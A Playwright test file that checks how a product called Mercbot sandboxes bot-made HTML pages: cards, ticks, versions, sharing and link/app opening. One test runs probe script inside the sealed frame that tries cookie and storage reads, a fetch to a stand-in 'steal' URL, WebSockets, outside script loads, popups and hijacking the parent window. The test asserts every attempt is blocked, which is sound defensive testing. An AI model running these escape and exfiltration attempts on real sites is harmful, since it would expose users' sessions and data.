import knexLib from "knex";
import { expect, expectRefusal, test, testDatabaseName, type Page } from "./harness";

// Rich HTML pages (D-74), on the Test Preview target, under the API guard. Each test makes its own bot,
// puts a page in its Pages folder (uploaded as it is) and a card of it in its chat (written to the
// database), then uses it as a person would: the card, the viewer in place of the chat, ticks, Share,
// Versions and Restore, links and the doorway to apps. The sealed frame
// is probed from inside, as the page's own script would: it can't read cookies, call Mercbot, load
// anything from outside, submit forms, open popups or frames, or move the window around it, and it
// opens a link or an app only from the person's own click in it.
const HOME = "/w/you";
const PAGE = "/files/bot/Pages/probe.html";
const PROBE = `<!DOCTYPE html><html><head><title>Probe page</title></head><body>
<h1>Probe page</h1><p>Everything a page shouldn't be able to do.</p>
<ul class="checklist"><li>First thing</li><li>Second thing</li></ul>
<a class="card" href="https://example.invalid/visit">Example place</a>
<p><a class="app" data-app="contacts" data-screen="stages" data-id="1">Open Contacts</a>
<a class="app" data-app="no-such-app">Open nothing</a>
<a id="away" href="https://example.invalid/away">Away</a></p>
<form id="form" action="/api/session" method="post"><input name="x" value="1"><button id="send">Send</button></form>
<script>window.pageScriptRan = true;
parent.postMessage({ mercbotPage: 1, kind: "link", href: "https://example.invalid/on-load" }, "*");
parent.postMessage({ mercbotPage: 1, kind: "open-app", app: "contacts", screen: "list", params: {} }, "*");</script>
</body></html>`;
test.use({ apiGuard: true });
test.describe.configure({ mode: "serial" });

const database = () => knexLib({
  client: "pg",
  connection: { host: process.env.DB_HOST, port: Number(process.env.DB_PORT) || 5432, user: process.env.DB_USER, password: process.env.DB_PASSWORD, database: testDatabaseName() }
});

async function openHome(page: Page, query = "") {
  await page.goto(`${HOME}${query}`);
  const next = page.getByRole("button", { name: "Next" });
  const shell = page.locator(".mb-shell");
  await expect(shell.or(next).first()).toBeVisible();
  if (await next.isVisible()) {
    for (let slide = 0; slide < 3; slide += 1) await next.click();
  }
  await expect(shell).toBeVisible();
}

/** A new bot of the signed-in person, with the probe page in its Pages folder and its card (and a link to it) in the chat. */
async function botWithPage(page: Page, versions: string[] = []) {
  const { csrfToken } = await (await page.request.get("/api/session")).json();
  const created = await page.request.post(`/api${HOME}/bots`, { headers: { "csrf-token": csrfToken }, data: { name: `Paige ${Date.now().toString(36)}`, color: "#1E86FC" } });
  expect(created.ok()).toBe(true);
  const { bot } = await created.json();
  const upload = await page.request.post(`/api${HOME}/bots/${bot.id}/files/upload?folder=${encodeURIComponent("/files/bot/Pages")}`, {
    headers: { "csrf-token": csrfToken },
    multipart: { file: { name: "probe.html", mimeType: "text/html", buffer: Buffer.from(PROBE) } }
  });
  expect(upload.ok()).toBe(true);
  expect((await upload.json()).path).toBe(PAGE);
  const knex = database();
  try {
    const conversation = await knex("bot_conversations").where({ bot_id: bot.id }).whereNotNull("user_id").first();
    await knex("bot_conversations").where({ id: conversation.id }).update({ onboarding_step: null });
    const at = { bot_id: bot.id, conversation_id: conversation.id, workspace_id: conversation.workspace_id };
    await knex("bot_messages").insert([
      { ...at, kind: "text", role: "user", body: { text: "Make me a probe page" } },
      { ...at, kind: "text", role: "bot", body: { text: `Here it is: [Probe page](${PAGE}).` } },
      { ...at, kind: "page", role: "bot", body: { path: PAGE, title: "Probe page", summary: "Everything a page shouldn't be able to do." } }
    ]);
    for (const [index, content] of versions.entries()) {
      await knex("page_versions").insert({ workspace_id: at.workspace_id, bot_id: bot.id, path: PAGE, page_key: "e2e-key", kind: index ? "edit" : "save", content });
    }
  } finally {
    await knex.destroy();
  }
  return { id: String(bot.id), name: bot.name as string, csrfToken };
}

const view = (page: Page) => page.locator(".mb-page-view");
const sealed = (page: Page) => view(page).frameLocator("iframe");
async function sealedFrame(page: Page) {
  await expect(sealed(page).getByRole("heading", { name: "Probe page" })).toBeVisible();
  const frame = page.frames().find((each) => /\/api\/pages\/[^/]+\/probe\.html$/u.test(each.url()));
  expect(frame, "the page's frame, from its page-only address").toBeTruthy();
  return frame!;
}

test("a page's card opens the page in place of the chat; ticks are saved in it; Close goes back", async ({ page, context }, info) => {
  await openHome(page);
  const bot = await botWithPage(page);
  await openHome(page, `?bot=${bot.id}`);
  const card = page.locator(".mb-page-card");
  await expect(card).toBeVisible();
  await expect(card.frameLocator("iframe").getByRole("heading", { name: "Probe page" })).toBeVisible();
  await page.screenshot({ path: info.outputPath("card.png") });

  await card.getByRole("button", { name: "Open page Probe page" }).click();
  await expect.poll(() => new URL(page.url()).searchParams.get("page"), "the open page is in the address").toBe(PAGE);
  await expect(view(page).getByText("Probe page", { exact: true })).toBeVisible();
  await expect(page.locator(".mb-chat__dock textarea:not([aria-hidden])").first(), "the composer stays, sending to the bot").toBeVisible();
  await sealedFrame(page);
  await expect(sealed(page).getByText("0 of 2 done")).toBeVisible();
  // The page asks for a link and an app as it loads: the click that opened it doesn't count as one in it.
  await page.waitForTimeout(500);
  expect(context.pages(), "no tab opened").toHaveLength(1);
  expect(new URL(page.url()).pathname, "no app opened").toBe(HOME);

  const ticked = page.waitForResponse((response) => response.url().endsWith(`/bots/${bot.id}/pages/ticks`));
  await sealed(page).getByRole("switch", { name: "Second thing" }).check();
  expect((await ticked).ok()).toBe(true);
  await expect(sealed(page).getByText("1 of 2 done")).toBeVisible();
  const file = await (await page.request.get(`/api${HOME}/bots/${bot.id}/files/content?path=${encodeURIComponent(PAGE)}`)).text();
  expect(file).toMatch(/<li>First thing<\/li><li data-done="">Second thing<\/li>/u);
  await page.screenshot({ path: info.outputPath("viewer.png") });

  // Reloaded, the page is still open and still ticked.
  await page.reload();
  await expect(sealed(page).getByText("1 of 2 done")).toBeVisible();
  await view(page).getByRole("button", { name: "Close page" }).click();
  await expect(view(page)).toHaveCount(0);
  await expect(page).not.toHaveURL(/[?&]page=/u);
  await expect(page.locator(".mb-chat").getByText("Make me a probe page")).toBeVisible();

  // The reply's inline link opens it too.
  await page.locator(".mb-rich").getByRole("link", { name: "Probe page" }).click();
  await expect(view(page)).toBeVisible();
});

test("a sealed page can't read cookies, call Mercbot, load from outside, submit forms, open popups or frames, or move the window", async ({ page, context }) => {
  // The probe's own calls to Mercbot, which the page's policy and the browser stop on purpose.
  expectRefusal("no answer (csp): GET /api/session", "no answer (net::ERR_BLOCKED_BY_ORB): GET /api/session?probe=cookie");
  await openHome(page);
  const bot = await botWithPage(page);
  await openHome(page, `?bot=${bot.id}&page=${encodeURIComponent(PAGE)}&pageBot=${bot.id}`);
  const frame = await sealedFrame(page);
  const shellUrl = page.url();
  // Every request the page started, and those that reached a server and were answered: the browser
  // reports a request the policy then blocks too.
  const fromFrame: { url: string; method: string; cookie: boolean }[] = [];
  const answered: string[] = [];
  page.on("request", async (request) => {
    if (request.frame() !== frame) return;
    const headers = await request.allHeaders().catch(() => ({} as Record<string, string>));
    fromFrame.push({ url: request.url(), method: request.method(), cookie: "cookie" in headers });
  });
  page.on("requestfinished", (request) => {
    if (request.frame() === frame) answered.push(request.url());
  });
  const popups: string[] = [];
  context.on("page", (other) => popups.push(other.url()));

  const found = await frame.evaluate(async () => {
    const violated = new Set<string>();
    document.addEventListener("securitypolicyviolation", (event) => violated.add(event.effectiveDirective));
    const attempt = async (work: () => unknown) => {
      try {
        const result = await work();
        return result === undefined ? "done" : String(result);
      } catch (error) {
        return `refused: ${(error as Error).name}`;
      }
    };
    const loads = (element: HTMLImageElement | HTMLScriptElement, src: string) => new Promise((resolve) => {
      element.onload = () => resolve("loaded");
      element.onerror = () => resolve("refused");
      element.src = src;
      document.body.append(element);
    });
    const result = {
      origin: window.origin,
      cookie: await attempt(() => document.cookie),
      storage: await attempt(() => window.localStorage.length),
      fetch: await attempt(() => fetch("/api/session").then((response) => response.status)),
      outsideFetch: await attempt(() => fetch("https://example.invalid/steal?x=1").then((response) => response.status)),
      xhr: await new Promise((resolve) => {
        const request = new XMLHttpRequest();
        request.onload = () => resolve(`loaded ${request.status}`);
        request.onerror = () => resolve("refused");
        try {
          request.open("GET", "/api/session");
          request.send();
        } catch (error) {
          resolve(`refused: ${(error as Error).name}`);
        }
      }),
      beacon: await attempt(() => navigator.sendBeacon("/api/session", "x")),
      socket: await new Promise((resolve) => {
        try {
          const socket = new WebSocket("wss://example.invalid/");
          socket.onopen = () => resolve("open");
          socket.onerror = () => resolve("refused");
        } catch (error) {
          resolve(`refused: ${(error as Error).name}`);
        }
      }),
      outsideImage: await loads(new Image(), "https://example.invalid/pixel.png"),
      outsideScript: await loads(document.createElement("script"), "https://example.invalid/library.js"),
      parentDocument: await attempt(() => window.parent.document.cookie),
      topLocation: await attempt(() => window.top!.location.href),
      popup: await attempt(() => (window.open("https://example.invalid/popup") === null ? "blocked" : "opened")),
      worker: await new Promise((resolve) => {
        try {
          const worker = new Worker("data:text/javascript,postMessage(1)");
          worker.onmessage = () => resolve("ran");
          worker.onerror = () => resolve("refused");
          setTimeout(() => resolve("refused: it never ran"), 800);
        } catch (error) {
          resolve(`refused: ${(error as Error).name}`);
        }
      }),
      sameOriginImage: await loads(new Image(), "/api/session?probe=cookie"),
      frame: await new Promise((resolve) => {
        const inner = document.createElement("iframe");
        inner.src = "/api/session?probe=frame";
        document.body.append(inner);
        setTimeout(() => resolve(violated.has("frame-src") ? "refused" : "loaded"), 800);
      })
    };
    // Submitting the form and moving the window around the page do nothing the page can see.
    (document.getElementById("form") as HTMLFormElement).requestSubmit();
    try {
      window.top!.location.href = "https://example.invalid/taken";
    } catch {
      // A sandboxed page may also be told so.
    }
    await new Promise((resolve) => setTimeout(resolve, 800));
    return { ...result, violated: [...violated].sort(), stillHere: document.querySelector("h1")?.textContent };
  });

  expect(found.origin, "the page has no origin of its own").toBe("null");
  expect(found.cookie).toMatch(/^refused: SecurityError/u);
  expect(found.storage).toMatch(/^refused: SecurityError/u);
  expect(found.fetch).toMatch(/^refused: TypeError/u);
  expect(found.outsideFetch).toMatch(/^refused: TypeError/u);
  expect(found.xhr).toMatch(/^refused/u);
  expect(found.socket).toMatch(/^refused/u);
  expect(found.outsideImage).toBe("refused");
  expect(found.outsideScript).toBe("refused");
  expect(found.parentDocument).toMatch(/^refused: SecurityError/u);
  expect(found.topLocation).toMatch(/^refused: SecurityError/u);
  expect(found.popup).toBe("blocked");
  expect(found.worker).toMatch(/^refused/u);
  expect(found.frame).toBe("refused");
  expect(found.violated).toEqual(expect.arrayContaining(["connect-src", "frame-src", "img-src", "script-src-elem"]));
  expect(found.stillHere).toBe("Probe page");
  expect(page.url(), "the window around the page didn't move").toBe(shellUrl);
  expect(popups).toEqual([]);
  // Nothing the page asked for carried the person's cookies, and nothing reached a server but the page's
  // own address and the picture it was allowed to load from Mercbot.
  expect(fromFrame.filter((request) => request.cookie)).toEqual([]);
  expect(fromFrame.filter((request) => request.method !== "GET")).toEqual([]);
  expect(answered.filter((url) => !/\/api\/pages\/|\/api\/session\?probe=cookie$/u.test(url))).toEqual([]);
  expect(fromFrame.find((request) => request.url.endsWith("/api/session?probe=cookie")), "the picture asked of Mercbot went without cookies")
    .toMatchObject({ method: "GET", cookie: false });

  // Messages the page sends without the person's click open nothing; one from elsewhere is ignored.
  await frame.evaluate(() => {
    window.parent.postMessage({ mercbotPage: 1, kind: "link", href: "https://example.invalid/sneaky" }, "*");
    window.parent.postMessage({ mercbotPage: 1, kind: "open-app", app: "contacts", screen: "list", params: {} }, "*");
  });
  await page.evaluate(() => window.postMessage({ mercbotPage: 1, kind: "open-app", app: "contacts", screen: "list", params: {} }, "*"));
  await page.waitForTimeout(800);
  expect(popups).toEqual([]);
  expect(page.url()).toBe(shellUrl);
});

test("a link the person clicks opens outside; the doorway opens only the home's apps, in their own view", async ({ page, context }) => {
  await openHome(page);
  const bot = await botWithPage(page);
  await openHome(page, `?bot=${bot.id}&page=${encodeURIComponent(PAGE)}&pageBot=${bot.id}`);
  await sealedFrame(page);
  // The outside site, answered here so the new tab has a page to look from.
  await context.route("https://example.invalid/**", (route) => route.fulfill({ contentType: "text/html", body: "<p>Away</p>" }));
  const opened = context.waitForEvent("page");
  await sealed(page).getByRole("link", { name: "Away" }).click();
  const away = await opened;
  await away.waitForLoadState();
  expect(away.url()).toBe("https://example.invalid/away");
  expect(await away.evaluate(() => window.opener), "the new tab can't reach Mercbot's window").toBeNull();
  await away.close();

  await sealed(page).getByRole("link", { name: "Open nothing" }).click();
  await expect(page.locator(".mb-toast")).toContainText("There's no app \"no-such-app\" in this home.");
  await expect(view(page)).toBeVisible();

  await sealed(page).getByRole("link", { name: "Open Contacts" }).click();
  await expect(page, "only the parameters its screen takes").toHaveURL(new RegExp(`${HOME}/apps/contacts/stages$`, "u"));
  await page.goBack();
  await expect(sealed(page).getByRole("heading", { name: "Probe page" })).toBeVisible();
});

test("Versions lists the page's saves and Restore brings an earlier one back", async ({ page }) => {
  await openHome(page);
  const old = PROBE.replace("Everything a page shouldn't be able to do.", "The first version.");
  const bot = await botWithPage(page, [old, PROBE]);
  await openHome(page, `?bot=${bot.id}&page=${encodeURIComponent(PAGE)}&pageBot=${bot.id}`);
  await sealedFrame(page);
  await view(page).getByRole("button", { name: "More" }).click();
  await page.getByRole("menuitem", { name: "Versions" }).or(page.locator(".v-overlay--active .v-list-item").filter({ hasText: "Versions" })).first().click();
  const versions = page.locator(".v-dialog").filter({ hasText: "Versions of Probe page" });
  await expect(versions.getByText(`Changed by ${bot.name} (showing)`)).toBeVisible();
  await versions.getByRole("button", { name: "Restore" }).click();
  await expect(versions.getByText("Restored by you (showing)")).toBeVisible();
  await expect(sealed(page).getByText("The first version.")).toBeVisible();
  await expect(page.locator(".mb-toast")).toContainText("Version restored");
});

test("the Library's Share… is the page's Share, and Delete ends its versions and marks its card", async ({ page }) => {
  await openHome(page);
  const bot = await botWithPage(page, [PROBE]);
  await openHome(page, `?bot=${bot.id}`);
  const chat = page.getByRole("main", { name: "Chat" });
  await chat.getByRole("button", { name: `${bot.name} details` }).click();
  const details = page.getByRole("complementary", { name: "Details" });
  await details.getByRole("tab", { name: "Library" }).click();
  const row = details.locator(".mb-library__row").filter({ hasText: "Probe page" });
  const menu = page.locator(".v-overlay--active .mb-menu .mb-menu__text");

  await row.hover();
  await expect(page.locator(".mb-hover-card").filter({ hasText: "Probe page" }), "a web page is the home's").toContainText("Everyone in");
  await row.getByRole("button", { name: "More for Probe page" }).click();
  await menu.filter({ hasText: "Share…" }).click();
  const share = page.getByRole("region", { name: "Share Probe page" });
  await expect(share.getByText("Everyone in this home")).toBeVisible();
  await expect(share.getByRole("radio"), "no Only you").toHaveCount(0);
  await share.getByRole("button", { name: "Close" }).click();
  await expect(share).toBeHidden();

  await row.getByRole("button", { name: "More for Probe page" }).click();
  await menu.filter({ hasText: "Delete" }).click();
  await page.locator(".mb-confirm").getByRole("button", { name: "Delete" }).click();
  await expect(row).toHaveCount(0);
  await expect(chat.getByRole("button", { name: "Page Probe page, deleted" }), "its card stays, marked deleted").toBeDisabled();

  const knex = database();
  try {
    expect(await knex("page_versions").where({ bot_id: bot.id, path: PAGE }).count("* as n").first(), "its versions").toEqual({ n: "0" });
  } finally {
    await knex.destroy();
  }
});
